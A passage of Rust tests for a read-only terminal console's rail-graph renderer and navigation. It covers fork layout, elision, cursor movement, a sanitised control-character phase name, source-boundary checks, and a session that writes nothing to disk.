    // The fork LEAVES the rail and REJOINS it, symmetric about the rail.
    let join = &plan.segments[1].joins[0];
    assert!(join.x1 > join.x0 + 3, "a fork spans its members");
    assert_eq!(join.rows, vec![plan.rail_row - 1, plan.rail_row + 1]);
    assert!(
        !join.on_rail,
        "an even count leaves the rail row to the rail"
    );
    assert_eq!(join.label.as_deref(), Some("positions"));
    // Its members carry the model's own classes.
    let lanes: Vec<Class> = plan.segments[1]
        .marks
        .iter()
        .filter(|mark| mark.row != plan.rail_row)
        .map(|mark| mark.class)
        .collect();
    assert_eq!(lanes, vec![Class::Finished, Class::Active]);

    // AC-draw-3: `×N` only when the phase was revisited.
    assert_eq!(plan.segments[0].name, "intake");
    assert_eq!(plan.segments[1].name, "design ×2");
    assert_eq!(plan.segments[2].name, "verify");
    // A corrupt fold cannot put twenty digits on the baseline.
    let corrupt = vec![gphase("corrupt", u64::MAX, true, Vec::new())];
    let clamped = plan_of(&corrupt, None, "running", 80, 7);
    assert_eq!(clamped.segments[0].name, "corrupt ×99+");

    // The current phase is distinguished on the baseline whether or not
    // it has a rail node of its own to fill.
    assert_eq!(plan.segments[2].class, Some(Class::Current));
    assert_eq!(plan.segments[0].class, None);

    // An empty rail is an empty plan, not an invented one.
    let empty = plan_of(&[], None, "running", 80, 7);
    assert!(empty.segments.is_empty() && empty.rail.is_none());
    assert_eq!(paint(&empty, 0, false).len(), 7, "still a frame");

    // A column the derivation left with no nodes at all.
    let hollow = vec![gphase("hollow", 1, true, vec![gcolumn(None, Vec::new())])];
    let hollow = plan_of(&hollow, None, "running", 80, 7);
    let mark = &hollow.segments[0].marks[0];
    assert_eq!(mark.class, Class::Unknown);
    assert!(!mark.live && !mark.selected);
}

/// `plan` with the two cursors left out — most geometry cases do not
/// care about them, and naming them each time buries what they do.
fn plan_of(
    phases: &[Phase],
    lens: Option<&render::Lens>,
    status: &str,
    width: usize,
    height: usize,
) -> Plan {
    plan(phases, lens, status, None, None, width, height)
}

#[test]
fn the_lens_marks_the_scoped_phase_and_hides_none_of_them() {
    let phases = rail_phases();
    let views = graph_views(rail_phases(), "running");
    let view = views.run.as_ref().unwrap();
    let lens = render::lens_for(view, Some(&render::Scope::Phase("design".to_string())))
        .unwrap()
        .unwrap();

    // AC-draw-4: `render::keeps_phase` decides the marker — the crate's
    // ONE phase predicate, called and never reimplemented.
    let marked = plan_of(&phases, Some(&lens), "running", 80, 7);
    assert_eq!(marked.segments.len(), 3, "the lens marks; it does not hide");
    assert!(marked.segments[1].name.starts_with('▸'), "the scoped one");
    assert!(!marked.segments[0].name.starts_with('▸'));
    assert!(!marked.segments[2].name.starts_with('▸'));
    // With no scope at all there is nothing to mark.
    let unmarked = plan_of(&phases, None, "running", 80, 7);
    assert!(unmarked.segments.iter().all(|seg| !seg.name.contains('▸')));

    // Every name sits on ONE baseline, by construction rather than by
    // three separate rows that happen to agree.
    let text = text_of(&paint(&marked, 0, false));
    let baseline = text.lines().nth(marked.name_row).expect("a name row");
    for name in ["intake", "▸design ×2", "verify"] {
        assert!(
            baseline.contains(name),
            "{name} on the baseline: {baseline:?}"
        );
    }
}

// ------------------------------------------------ AC-mode-2, AC-mode-3

#[test]
fn a_fork_wider_than_its_lane_budget_counts_what_it_could_not_draw() {
    // Six members with two lane rows on each side: four are drawn and
    // the two that were not are counted on the outermost lane.
    let phases = vec![gphase(
        "panel",
        1,
        true,
        vec![gcolumn(None, members(6, "on-phosphor"))],
    )];
    // Height 7: one row is the box row, one the names, one the rail,
    // leaving two lane rows a side — four of the six members.
    let plan = plan_of(&phases, None, "running", 80, 7);
    assert_eq!(plan.mode, Mode::Full);
    let join = &plan.segments[0].joins[0];
    assert_eq!(join.rows.len(), 4, "as many lanes as the budget holds");
    let labels: Vec<&str> = plan.segments[0]
        .marks
        .iter()
        .map(|mark| mark.label.as_str())
        .collect();
    assert!(
        labels.iter().any(|label| label.ends_with(" +2")),
        "no member is silently dropped: {labels:?}"
    );
    assert!(
        text_of(&paint(&plan, 0, false)).contains("+2"),
        "and the count is drawn"
    );

    // An odd count puts one member ON the rail row, and the step name
    // then yields the row it would have taken.
    let phases = vec![gphase(
        "panel",
        1,
        true,
        vec![gcolumn(Some("three"), members(3, "on-phosphor"))],
    )];
    let plan = plan_of(&phases, None, "running", 80, 8);
    let join = &plan.segments[0].joins[0];
    assert!(join.on_rail, "three members straddle the rail");
    assert_eq!(join.label, None, "a member rides the row the name wanted");
    assert!(
        text_of(&paint(&plan, 0, false)).contains('┼'),
        "and the trunk says so"
    );
}

#[test]
fn the_rail_window_is_derived_from_the_cursor_and_marks_what_it_elides() {
    let phases: Vec<Phase> = (0..8)
        .map(|index| gphase(&format!("phase-{index}"), 1, index == 0, Vec::new()))
        .collect();

    // Wide enough for the whole rail: nothing is elided.
    let whole = plan_of(&phases, None, "running", 200, 5);
    assert_eq!(whole.segments.len(), 8);
    assert!(!whole.left_elided && !whole.right_elided);

    // Narrow, with the cursor at each end and in the middle. The window
    // ALWAYS contains the cursor, and says which way the rest went.
    let head = plan(&phases, None, "running", Some("phase-0"), None, 40, 5);
    assert!(!head.left_elided && head.right_elided);
    let tail = plan(&phases, None, "running", Some("phase-7"), None, 40, 5);
    assert!(tail.left_elided && !tail.right_elided);
    let middle = plan(&phases, None, "running", Some("phase-4"), None, 26, 5);
    assert!(middle.left_elided && middle.right_elided);
    for (plan, cursor) in [(&head, "phase-0"), (&tail, "phase-7"), (&middle, "phase-4")] {
        assert!(
            plan.segments.iter().any(|seg| seg.key == cursor),
            "the window always contains {cursor}"
        );
        let text = text_of(&paint(plan, 0, false));
        assert_eq!(text.contains('‹'), plan.left_elided);
        assert_eq!(text.contains('›'), plan.right_elided);
    }

    // With no cursor the window falls back to the CURRENT phase, and
    // with neither to the head of the rail.
    assert_eq!(anchor_of(&phases, Some("phase-5")), 5);
    assert_eq!(anchor_of(&phases, None), 0, "the current phase");
    assert_eq!(
        anchor_of(&phases, Some("gone")),
        0,
        "a stale key anchors nothing"
    );
    let nothing: Vec<Phase> = vec![gphase("a", 1, false, Vec::new())];
    assert_eq!(anchor_of(&nothing, None), 0, "no cursor and no current");

    // THERE IS NO SCROLL OFFSET. The window is a function of the cursor
    // and the rect, so asking twice in any order answers the same.
    let again = plan(&phases, None, "running", Some("phase-7"), None, 40, 5);
    assert_eq!(tail, again, "derived every frame, never remembered");
    assert_ne!(tail, head);

    // A phase whose own columns run past the pane's edge says so with
    // the same mark rather than pretending the phase ended there.
    let long = vec![gphase(
        "long",
        1,
        true,
        (0..12)
            .map(|index| {
                gcolumn(
                    None,
                    vec![gnode(&format!("step{index}"), "x", "on-phosphor")],
                )
            })
            .collect(),
    )];
    let cut = plan_of(&long, None, "running", 40, 5);
    assert!(cut.right_elided, "the phase continues past the edge");
    assert!(cut.segments[0].x1 < cut.width - 1, "and nothing spills");
}

// ------------------------- AC-draw-1, AC-draw-2, AC-mode-1, AC-width-1

#[test]
fn the_graph_draws_the_consoles_grammar_in_every_mode_and_at_the_floor() {
    let views = graph_views(rail_phases(), "running");
    let tui = at_graph();

    // AC-width-1 at 80 columns: the full grammar, all of it.
    let frame = frame_of(&tui, &views, 80, 24);
    for element in ["──ᐳ", "┤", "├", "┌", "┐", "└", "┘"] {
        assert!(frame.contains(element), "{element} missing:\n{frame}");
    }
    // AC-draw-1: two lanes leave the rail, run parallel, and REJOIN it
    // before the next step's edge.
    let plan = plan_of(&rail_phases(), None, "running", 78, 5);
    let join = &plan.segments[1].joins[0];
    let lines: Vec<String> = text_of(&paint(&plan, 0, false))
        .lines()
        .map(str::to_string)
        .collect();
    let rail: Vec<char> = lines[plan.rail_row].chars().collect();
    assert_eq!(rail[join.x0], '┤', "the lanes leave the rail here");
    assert_eq!(rail[join.x1], '├', "and rejoin it here");
    assert!(
        rail[join.x1 + 1..].contains(&'ᐳ'),
        "the next step's edge comes AFTER the rejoin: {:?}",
        lines[plan.rail_row]
    );
    for row in &join.rows {
        let lane: Vec<char> = lines[*row].chars().collect();
        assert!(
            "┌└".contains(lane[join.x0]) && "┐┘".contains(lane[join.x1]),
            "a lane corners out of the rail and back into it"
        );
    }
    // AC-draw-2: a plain phase is one rail node; single-node columns are
    // arrowed rail steps.
    assert_eq!(plan.segments[0].marks.len(), 1, "a plain phase is one node");
    assert_eq!(plan.segments[0].marks[0].row, plan.rail_row);
    assert!(
        lines[plan.rail_row].contains("⏺ only") || lines[plan.rail_row].contains("⏺ review"),
        "a one-node step sits on the rail with its label: {:?}",
        lines[plan.rail_row]
    );

    // AC-mode-1: each mode renders, and each one that cannot draw lanes
    // still says `⑂n` rather than collapsing parallel into sequential.
    let rail_mode = plan_of(&rail_phases(), None, "running", 78, 3);
    assert_eq!(rail_mode.mode, Mode::Rail);
    let text = text_of(&paint(&rail_mode, 0, false));
    assert!(text.contains("⑂2"), "a collapsed fork still forks: {text}");
    assert!(text.contains("──ᐳ") && text.contains("design ×2"), "{text}");
    assert_eq!(paint(&rail_mode, 0, false).len(), 3);

    let squeezed = plan_of(&rail_phases(), None, "running", 78, 1);
    assert_eq!(squeezed.mode, Mode::Compressed);
    let text = text_of(&paint(&squeezed, 0, false));
    assert_eq!(
        paint(&squeezed, 0, false).len(),
        1,
        "one row, never a blank pane"
    );
    for element in ["intake", "design ×2", "⑂2", "verify", "──ᐳ"] {
        assert!(text.contains(element), "{element} missing from {text:?}");
    }

    // AC-width-1 at the floor: legible, uncorrupted, and still a graph.
    let narrow = buffer_of(&tui, &views, MIN_WIDTH, 24);
    let frame = narrow.join("\n");
    assert!(!frame.contains("too small"), "{frame}");
    assert!(
        frame.contains('┤') && frame.contains('├'),
        "the fork survives 60 columns:\n{frame}"
    );
    for row in narrow.iter().take(9) {
        let cells: Vec<char> = row.chars().collect();
        assert_eq!(cells.len(), usize::from(MIN_WIDTH));
        assert!(
            "│┌└".contains(cells[0]) && "│┐┘".contains(cells[cells.len() - 1]),
            "no frame is corrupted: {row:?}"
        );
    }
}

// ------------------------------------------------- AC-safe-1, AC-safe-2

#[test]
fn a_hostile_phase_name_renders_inert_and_does_not_move_its_neighbour() {
    let hostile = "de\u{202E}sign\u{200B}\x07\r";
    let phases = vec![
        gphase("intake", 1, false, Vec::new()),
        gphase(hostile, 1, true, Vec::new()),
        gphase("verify", 1, false, Vec::new()),
    ];
    let plan = plan_of(&phases, None, "running", 80, 7);
    assert_eq!(plan.segments[1].name, "design", "inert, in source order");
    assert_eq!(
        plan.segments[1].x1 - plan.segments[1].x0 + 1,
        6,
        "six columns, which is what the terminal will draw"
    );
    assert_eq!(
        plan.segments[2].x0,
        plan.segments[1].x1 + 1 + ARROW_WIDTH,
        "the following segment starts at its expected x"
    );
    let text = text_of(&paint(&plan, 0, false));
    for character in ['\u{202E}', '\u{200B}', '\x07', '\r'] {
        assert!(!text.contains(character), "{character:?} reached a cell");
    }

    // AC-safe-2: a CJK name is twelve columns wide, not six, and the
    // rail is laid out on that measurement.
    let phases = vec![
        gphase("設計フェーズ", 1, true, Vec::new()),
        gphase("verify", 1, false, Vec::new()),
    ];
    let plan = plan_of(&phases, None, "running", 80, 7);
    assert_eq!(plan.segments[0].x1 - plan.segments[0].x0 + 1, 12);
    assert_eq!(plan.segments[1].x0, plan.segments[0].x1 + 1 + ARROW_WIDTH);
    // Drawn: the neighbour lands where the plan says, in the buffer and
    // not only in the geometry. (`TestBackend` keeps a double-width
    // glyph's second column as its own cell, so the buffer text carries
    // a gap the terminal does not — the claim worth making is the x.)
    let views = graph_views(
        vec![
            gphase("設計フェーズ", 1, true, Vec::new()),
            gphase("verify", 1, false, Vec::new()),
        ],
        "running",
    );
    let lines = buffer_of(&at_graph(), &views, 80, 24);
    let drawn = plan_of(
        &[
            gphase("設計フェーズ", 1, true, Vec::new()),
            gphase("verify", 1, false, Vec::new()),
        ],
        None,
        "running",
        78,
        5,
    );
    let baseline = lines
        .iter()
        .position(|line| line.contains("verify"))
        .expect("the name baseline is drawn");
    assert!(
        at(&lines[baseline], drawn.segments[1].name_x + 1).starts_with("verify"),
        "the CJK name did not displace its neighbour: {:?}",
        lines[baseline]
    );
    assert!(lines[baseline].contains('設'), "{:?}", lines[baseline]);
}

// ------------------------------ AC-nav-1, AC-nav-2, AC-nav-3, AC-nav-5

#[test]
fn the_graph_cursor_walks_the_rail_with_the_arrows_and_the_lanes_with_up_down() {
    let views = views();
    let mut tui = at_run();
    assert!(in_graph(&tui));

    // The rail, both ways, wrapping at both ends — all through the same
    // `move_to` every other list already uses.
    apply(&mut tui, &views, Key::Right);
    assert_eq!(tui.cursor[0].as_deref(), Some("intake"));
    apply(&mut tui, &views, Key::Right);
    assert_eq!(tui.cursor[0].as_deref(), Some("design"));
    apply(&mut tui, &views, Key::Right);
    assert_eq!(tui.cursor[0].as_deref(), Some("intake"), "wraps at one end");
    apply(&mut tui, &views, Key::Left);
    assert_eq!(tui.cursor[0].as_deref(), Some("design"), "and at the other");

    // Into the lanes, in draw order, wrapping at both edges.
    let lanes = lane_keys(&tui, &views);
    assert!(lanes.len() > 1, "design has members: {lanes:?}");
    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.node.as_deref(), Some(lanes[0].as_str()));
    apply(&mut tui, &views, Key::Up);
    assert_eq!(
        tui.node.as_deref(),
        lanes.last().map(String::as_str),
        "wraps at the top of a lane group"
    );
    apply(&mut tui, &views, Key::Down);
    assert_eq!(
        tui.node.as_deref(),
        Some(lanes[0].as_str()),
        "and at the foot"
    );

    // Moving the rail drops the lane the cursor was in.
    apply(&mut tui, &views, Key::Left);
    assert_eq!(tui.node, None);
    assert_eq!(tui.cursor[0].as_deref(), Some("intake"));

    // With no rail cursor at all there are no lanes to be in, and a
    // level with no run has none either.
    tui.cursor[0] = None;
    assert!(lane_keys(&tui, &views).is_empty());
    assert!(lane_keys(&at_run(), &Views::empty()).is_empty());

    // A PLAIN phase has no nodes, so `↑↓` there are inert by
    // construction rather than by a special case.
    let plain = graph_views(rail_phases(), "running");
    let mut tui = at_graph();
    apply(&mut tui, &plain, Key::Right);
    assert_eq!(tui.cursor[0].as_deref(), Some("intake"));
    assert!(
        lane_keys(&tui, &plain).is_empty(),
        "a plain phase has no lanes"
    );
    apply(&mut tui, &plain, Key::Down);
    assert_eq!(tui.node, None);
}

#[test]
fn enter_scopes_the_phase_whatever_the_lane_cursor_says() {
    let views = views();
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Down);
    let lane = tui.node.clone();
    assert!(lane.is_some(), "the cursor walked into a lane");
    assert!(
        scoped_seat(&tui).is_some(),
        "and scoped that member on the way in"
    );
    apply(&mut tui, &views, Key::Enter);
    assert!(
        matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "design"),
        "Enter scopes the PHASE, not the lane: {}",
        status_line(&tui)
    );
    assert_eq!(
        tui.node, lane,
        "Enter overwrites the scope the lane cursor set, and leaves the cursor where it stands"
    );
}

#[test]
fn a_graph_selection_survives_a_refresh_and_a_vanished_node_highlights_nothing() {
    let views = views();
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Down);
    let lane = tui.node.clone();

    // A refresh with the same subjects keeps both selections.
    let fresh = views_with("intake");
    settle(&mut tui, &fresh);
    assert_eq!(tui.cursor[0].as_deref(), Some("design"));
    assert_eq!(tui.node, lane);

    // A lane key whose node went away highlights nothing and does not
    // panic — the absence of code, not a diff routine.
    tui.node = Some("a node that is no longer drawn".to_string());
    let view = fresh.run.as_ref().unwrap();
    let plan = plan(
        &view.phases,
        None,
        "running",
        tui.cursor[0].as_deref(),
        tui.node.as_deref(),
        100,
        7,
    );
    assert!(
        plan.segments
            .iter()
            .flat_map(|seg| &seg.marks)
            .all(|mark| !mark.selected),
        "a stale key matches no drawn node"
    );
    let _ = frame_of(&tui, &fresh, 100, 24);
    // And the next move lands on a real node again.
    apply(&mut tui, &fresh, Key::Up);
    assert_eq!(
        tui.node.as_deref(),
        Some(lane_keys(&tui, &fresh)[0].as_str())
    );

    // A phase that vanished takes the whole graph selection with it.
    let empty = Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(brokkr_view::run_view(&[], None)),
        transcript: None,
        note: None,
    };
    settle(&mut tui, &empty);
    assert!(selected(&tui, &empty).is_none());
    assert!(lane_keys(&tui, &empty).is_empty());
    let _ = frame_of(&tui, &empty, 100, 24);
    // A new run clears it outright, alongside every other selection.
    tui.node = Some("held".to_string());
    tui.assign_run("run-old".to_string());
    assert_eq!(tui.node, None);
}

#[test]
fn the_rail_arrows_are_a_named_no_op_in_every_other_pane() {
    let views = views();

    // At the fleet, where there is no rail at all.
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Down);
    let held = (tui.cursor[0].clone(), tui.pane, tui.level);
    apply(&mut tui, &views, Key::Left);
    apply(&mut tui, &views, Key::Right);
    assert_eq!((tui.cursor[0].clone(), tui.pane, tui.level), held);
    assert_eq!(tui.node, None);

    // At the seats and at the trail.
    for pane in [1usize, 2] {
        let mut tui = at_run();
        tui.pane = pane;
        tui.cursor[pane] = Some("held".to_string());
        apply(&mut tui, &views, Key::Left);
        apply(&mut tui, &views, Key::Right);
        assert_eq!(tui.cursor[pane].as_deref(), Some("held"));
        assert_eq!(tui.node, None);
    }

    // And at the PARTICIPANT level, whose panes are paragraphs.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    apply(&mut tui, &views, Key::Down);
    let offset = tui.offset;
    apply(&mut tui, &views, Key::Left);
    apply(&mut tui, &views, Key::Right);
    assert_eq!(tui.offset, offset, "an arrow with no axis changes nothing");
}

// -------------------------------------------------------------- AC-nav-4

#[test]
fn the_selection_and_the_current_phase_differ_in_a_channel_that_is_not_colour() {
    let views = graph_views(rail_phases(), "running");
    let mut tui = at_graph();

    // The selected phase is NOT the current one: the name is REVERSED,
    // and the current phase's rail node is FILLED where a visited one's
    // is hollow. Two channels, neither of them colour.
    tui.cursor[0] = Some("intake".to_string());
    let (buffer, lines) = buffer_and_lines(&tui, &views, 100, 24);
    let baseline = baseline_of(&lines);
    assert!(
        modifier_at(&buffer, &lines, baseline, "intake").contains(Modifier::REVERSED),
        "the selection is REVERSED on the name"
    );
    assert!(
        !modifier_at(&buffer, &lines, baseline, "verify").contains(Modifier::REVERSED),
        "and the current phase is not the selection"
    );
    let frame = lines.join("\n");
    // State reads from colour and weight now — every node is the
    // operator-calibrated ⏺; visited is DIM, current is green.
    assert!(frame.contains('⏺'), "nodes are the calibrated dot");

    // And where the selected phase IS the current one, both marks are
    // present and still separable: REVERSED name, filled node.
    tui.cursor[0] = Some("verify".to_string());
    let (buffer, lines) = buffer_and_lines(&tui, &views, 100, 24);
    let baseline = baseline_of(&lines);
    assert!(
        modifier_at(&buffer, &lines, baseline, "verify").contains(Modifier::REVERSED),
        "the selection mark is still the selection mark"
    );
    assert!(
        !modifier_at(&buffer, &lines, baseline, "intake").contains(Modifier::REVERSED),
        "and it moved off the phase that no longer holds it"
    );
    let frame = lines.join("\n");
    assert!(frame.contains('⏺'), "{frame}");

    // A lane node the cursor has walked into wears the SAME selection
    // mark on its own label — one idiom wherever the cursor is, and it
    // is still the modifier channel rather than the colour one.
    let phases = rail_phases();
    let member = phases[1].columns[0].nodes[1].key.clone();
    let walked = plan(
        &phases,
        None,
        "running",
        Some("design"),
        Some(&member),
        78,
        5,
    );
    let selected: Vec<&Mark> = walked
        .segments
        .iter()
        .flat_map(|seg| &seg.marks)
        .filter(|mark| mark.selected)
        .collect();
    assert_eq!(selected.len(), 1, "one node, and only one");
    assert_eq!(selected[0].label, "robustness");
    let row = selected[0].row;
    let painted = paint(&walked, 0, false);
    assert!(
        painted[row].spans.iter().any(|span| {
            span.content.contains("robustness")
                && span.style.add_modifier.contains(Modifier::REVERSED)
        }),
        "the lane label carries the selection: {:?}",
        painted[row]
    );

    // And so does a one-node step, whose label is the STEP's own name.
    let step = phases[1].columns[1].nodes[0].key.clone();
    let stepped = plan(&phases, None, "running", Some("design"), Some(&step), 78, 5);
    assert!(
        stepped.segments[1]
            .marks
            .iter()
            .any(|mark| mark.selected && mark.label == "review"),
        "a single-node column selects through its own node's key"
    );
}

fn buffer_and_lines(
    tui: &Tui,
    views: &Views,
    width: u16,
    height: u16,
) -> (ratatui::buffer::Buffer, Vec<String>) {
    let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
    terminal.draw(|frame| draw(frame, tui, views)).unwrap();
    let buffer = terminal.backend().buffer().clone();
    let mut lines = Vec::new();
    for row in 0..buffer.area.height {
        let mut line = String::new();
        for column in 0..buffer.area.width {
            line.push_str(buffer[(column, row)].symbol());
        }
        lines.push(line);
    }
    (buffer, lines)
}

/// The one row carrying every phase name: the shared baseline, found by
/// what it IS rather than by an arithmetic guess at where it sits.
fn baseline_of(lines: &[String]) -> usize {
    lines
        .iter()
        .position(|line| {
            line.contains("intake") && line.contains("design") && line.contains("verify")
        })
        .expect("one baseline carrying every name")
}

fn modifier_at(
    buffer: &ratatui::buffer::Buffer,
    lines: &[String],
    row: usize,
    needle: &str,
) -> Modifier {
    let byte = lines[row].find(needle).expect("the text is on that row");
    let column = lines[row][..byte].chars().count();
    buffer[(u16::try_from(column).unwrap(), u16::try_from(row).unwrap())].modifier
}

// -------------------------------------------------- AC-anim-2, AC-anim-4

#[test]
fn a_live_node_pulses_and_a_still_terminal_and_a_still_run_never_do() {
    let mut views = graph_views(rail_phases(), "running");
    let mut tui = at_graph();
    tui.animate = true;

    let sweep = |tui: &mut Tui, views: &Views| -> Vec<String> {
        (0..8)
            .map(|tick| {
                tui.ticks = tick;
                frame_of(tui, views, 100, 24)
            })
            .collect()
    };

    // A live run animates: the glyph moves, and nothing else does.
    let frames = sweep(&mut tui, &views);
    assert!(
        frames.iter().any(|frame| frame != &frames[0]),
        "an active node on a live run pulses"
    );
    // AC-anim-4: geometry does not vary with the tick — the skeleton is
    // byte-identical across the whole period, and `plan` takes no tick.
    let skeleton = |frame: &String| -> String {
        frame
            .chars()
            .map(|glyph| match "⏺∙⊙⊗·".contains(glyph) {
                true => '@',
                false => glyph,
            })
            .collect()
    };
    for frame in &frames {
        assert_eq!(
            skeleton(frame),
            skeleton(&frames[0]),
            "only the glyph moves"
        );
    }

    // AC-anim-3: with animation off, every tick is the still frame —
    // set directly, with no environment touched.
    tui.animate = false;
    let stills = sweep(&mut tui, &views);
    assert!(
        stills.iter().all(|frame| frame == &stills[0]),
        "no animation, no motion"
    );
    assert_eq!(stills[0], frames[0], "and frame 0 IS the still frame");

    // AC-anim-2: a run that is not running is still at every tick, even
    // with animation on — the pulse gate is a model field. The FLEET
    // must be idle too: the forging beacon is fleet-gated by design,
    // and a live fleet keeps the corner pulsing over a concluded run.
    tui.animate = true;
    match views.run.as_mut().unwrap().summary.as_mut() {
        Some(summary) => summary.status = "completed".to_string(),
        None => panic!("the fixture folds"),
    }
    for row in &mut views.runs.runs {
        row.status = Some("completed".to_string());
    }
    let concluded = sweep(&mut tui, &views);
    assert!(
        concluded.iter().all(|frame| frame == &concluded[0]),
        "nothing live, nothing moving"
    );
}

// -------------------------------------------- AC-15, AC-17: the boundaries

/// The file itself is the evidence: a renderer that cannot name a store
/// cannot write to one, and a widget layer with exactly two sanitized
/// constructors cannot be handed raw journal text.
const SOURCE: &str = include_str!("../tui.rs");

#[test]
fn the_tui_source_names_no_store_no_runtime_and_no_unsanitized_widget() {
    for forbidden in ["Store", "brokkr_runtime", "append_next", "create_run"] {
        assert!(
            !SOURCE.contains(forbidden),
            "tui.rs must not name {forbidden}: the console is read-only"
        );
    }
    // The TUI returns an ExitCode like every other arm: a
    // `process::exit` would run past the guard's Drop and leave the
    // operator's terminal in raw mode.
    assert!(!SOURCE.contains("process::exit"));
    // Exactly one constructor of each, and both take sanitized text.
    assert_eq!(SOURCE.matches("Cell::from(").count(), 1);
    assert_eq!(SOURCE.matches("Span::styled(").count(), 1);
    assert_eq!(SOURCE.matches("Span::raw(").count(), 0);
    assert_eq!(SOURCE.matches("Paragraph::new(\"").count(), 0);
    // The graph is a character grid, and the ruling against ratatui's
    // plotting surface is held here rather than remembered: its colour
    // is per cell, last writer wins, which would cost the per-node
    // colour vocabulary, and its text call would be a third path into a
    // buffer whose safety is ratatui's rather than `Safe`'s.
    for forbidden in ["canvas", "Canvas", "Braille", "Marker::"] {
        assert!(
            !SOURCE.contains(forbidden),
            "the graph draws box characters, never {forbidden}"
        );
    }
    // And no derivation: no status table, no cost or duration
    // arithmetic, no topology, no scope predicate of its own.
    for derived in [
        "fn status_code",
        "fn fmt_dur",
        "to_fixed_4",
        "fn age",
        "total_cost_usd",
    ] {
        assert!(
            !SOURCE.contains(derived),
            "tui.rs must not derive {derived}"
        );
    }
}

/// A directory tree as bytes: relative path, length, content. Comparing
/// this before and after is what "the operator's disk looks the same
/// afterwards" actually means — an NDJSON export alone passes cleanly
/// through a created database, a WAL and a migration.
fn tree(dir: &Path) -> Vec<(String, usize, Vec<u8>)> {
    let mut out = Vec::new();
    for entry in std::fs::read_dir(dir).unwrap().flatten() {
        let path = entry.path();
        let name = path.file_name().unwrap().to_string_lossy().to_string();
        if path.is_dir() {
            for (child, len, bytes) in tree(&path) {
                out.push((format!("{name}/{child}"), len, bytes));
            }
            continue;
        }
        let bytes = std::fs::read(&path).unwrap();
        out.push((name, bytes.len(), bytes));
    }
    out.sort();
    out
}

#[test]
fn a_whole_tui_session_writes_nothing_at_all() {
    let _serialized = TERMINAL.lock().unwrap_or_else(|error| error.into_inner());
    let dir = tempfile::tempdir().unwrap();
    let db = dir.path().join("forge.db");
    {
        let mut store = Store::open(&db).unwrap();
        store
            .create_run(
                "run-proof",
                "a proof feature",
                "test",
                &json!({"files": {}}),
            )
            .unwrap();
        store
            .append_next(
                "run-proof",
                EventType::RunStarted,
                json!({"feature": "a proof feature", "manifest": {}}),
                None,
                None,
            )
            .unwrap();
        store
            .append_next(
                "run-proof",
                EventType::PhaseEntered,
                json!({"phase": "work"}),
                None,
                None,
            )
            .unwrap();
        store
            .append_next(
                "run-proof",
                EventType::EffectRequested,
                json!({"effect_id": "eff", "seat": "work", "phase": "work"}),
                None,
                None,
            )
            .unwrap();
    }
    let before_ndjson = Store::open(&db)
        .unwrap()
        .export_ndjson("run-proof")
        .unwrap();
    let before_tree = tree(dir.path());

    // Every navigation path, driven headlessly through the real
    // refresh source: descend, scope, descend again, filter, page,
    // help, refresh, ascend by both keys, and quit.
    script(&[
        Key::Down,
        Key::Enter,
        Key::Right,
        Key::Enter,
        Key::Up,
        Key::Left,
        Key::Escape,
        Key::Tab,
        Key::Down,
        Key::Enter,
        Key::Enter,
        Key::Down,
        Key::PageDown,
        Key::Tab,
        Key::Char('G'),
        Key::Backspace,
        Key::Char('/'),
        Key::Char('w'),
        Key::Enter,
        Key::Escape,
        Key::Char('r'),
        Key::Char('?'),
        Key::Escape,
        Key::Escape,
        Key::Quit,
    ]);
    let mut head = None;
    let mut source =
        |ask: Ask| crate::tui_views(&db, true, ask, &mut head, &mut None, || NOW.to_string());
    let mut terminal = Terminal::new(TestBackend::new(100, 30)).unwrap();
    let mut tui = Tui::new(None);
    let code = drive(&mut terminal, &test_ops(), &mut source, &mut tui, 40).unwrap();
    assert_eq!(code, ExitCode::SUCCESS);

    assert_eq!(
        Store::open(&db)
            .unwrap()
            .export_ndjson("run-proof")
            .unwrap(),
        before_ndjson,
        "the journal is byte-identical"
    );
    assert_eq!(
        tree(dir.path()),
        before_tree,
        "and so is the whole directory"
    );
}

#[test]
fn enter_on_a_trail_row_opens_it_for_reading_and_esc_closes() {
    // Panes clamp to the frame, so a long row — a feature text, a park
    // reason, an error tail — was truncated with no way through. Enter
    // opens the whole row; the reader owns movement while it is open,
    // so scrolling a payload does not also move the list behind it.
    let views = views();
    let mut tui = at_run();
    tui.pane = 2;
    let seq = keys_for(&tui, &views)[0].clone();
    tui.cursor[2] = Some(seq.clone());
    assert!(tui.reading.is_none());

    apply(&mut tui, &views, Key::Enter);
    let text = tui.reading.clone().expect("Enter opens the reader");
    assert!(text.contains(&format!("seq {seq}")), "{text}");
    assert!(text.contains("payload"), "{text}");
    assert!(footer_for(&tui, &views).contains("Esc or Enter close"));

    // Both quit spellings remain terminal while the reader owns input.
    assert_eq!(apply(&mut tui, &views, Key::Quit), Flow::Quit);
    assert_eq!(apply(&mut tui, &views, Key::Char('q')), Flow::Quit);

    // Movement scrolls the reader, and the list cursor stays put.
    let before = tui.cursor[2].clone();
    apply(&mut tui, &views, Key::Up);
    apply(&mut tui, &views, Key::Char('k'));
    assert_eq!(tui.read_offset, 0, "up saturates at the first line");
    apply(&mut tui, &views, Key::Down);
    apply(&mut tui, &views, Key::PageDown);
    assert_eq!(tui.read_offset, 11);
    assert_eq!(tui.cursor[2], before, "the list must not move underneath");
    apply(&mut tui, &views, Key::PageUp);
    assert_eq!(tui.read_offset, 1);
    apply(&mut tui, &views, Key::Char('x'));
    assert_eq!(tui.read_offset, 1, "unbound keys leave the reader in place");
    apply(&mut tui, &views, Key::Char('g'));
    assert_eq!(tui.read_offset, 0);

    // The full text reaches the frame, wrapped rather than clipped.
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("row · Esc closes"), "{frame}");

    apply(&mut tui, &views, Key::Escape);
    assert!(tui.reading.is_none(), "Esc closes the reader");
    assert_eq!(tui.read_offset, 0);
    // Esc closed the reader only — it did not also pop the level.
    assert_eq!(tui.level, Level::Run);

    // The participant transcript is a list of turns now — the operator
    // re-ruled the old "deliberately inert" paragraph contract: Enter
